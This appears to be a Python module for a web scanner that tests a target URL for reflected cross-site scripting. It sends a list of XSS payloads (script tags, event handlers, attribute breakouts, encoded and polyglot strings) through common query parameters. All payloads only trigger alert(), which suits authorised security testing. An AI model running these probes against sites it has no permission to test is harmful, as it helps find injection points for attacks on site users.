"""
XSS (Cross-Site Scripting) Detector Module
Tests for reflected XSS vulnerabilities by injecting script payloads.
Educational purposes only.
"""

import requests
from urllib.parse import quote

XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",

    # Event handler based
    "<img src=x onerror=alert('XSS')>",
    "<img/src=x onerror=alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",

    # SVG based
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",

    # Breaking out of attributes
    "'\"><script>alert('XSS')</script>",
    "\" onfocus=alert('XSS') autofocus=\"",
    "' onfocus='alert(1)' autofocus='",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "javascript:alert(document.domain)",

    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",

    # Data URI
    "data:text/html,<script>alert('XSS')</script>",

    # Template injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",

    # Polyglot payloads
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
]

# Common parameter names where XSS might be reflected
XSS_PARAMS = ["q", "search", "query", "s", "keyword", "id", "name", "page",
              "url", "redirect", "return", "next", "ref", "callback", "msg",
              "message", "error", "text", "input", "value", "data", "content"]


def detect_xss(url: str) -> bool:
    """
    Test the target URL for reflected XSS vulnerabilities.
    Injects script payloads across multiple parameter names and
    checks if they are reflected in the response body.
    Returns True if potential vulnerability is detected.
    """
    try:
        for payload in XSS_PAYLOADS:
            # Test across multiple parameter names
            for param in XSS_PARAMS[:5]:  # Test top 5 params to keep scan fast
                separator = "&" if "?" in url else "?"
                test_url = f"{url}{separator}{param}={quote(payload)}"

                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=True)

                    # Check if the payload is reflected in the response
                    if payload in response.text:
                        return True

                    # Check for partial reflection (unencoded special chars)
                    if "<script>" in response.text and "alert" in response.text:
                        return True

                except requests.exceptions.RequestException:
                    continue

    except Exception:
        pass

    return False
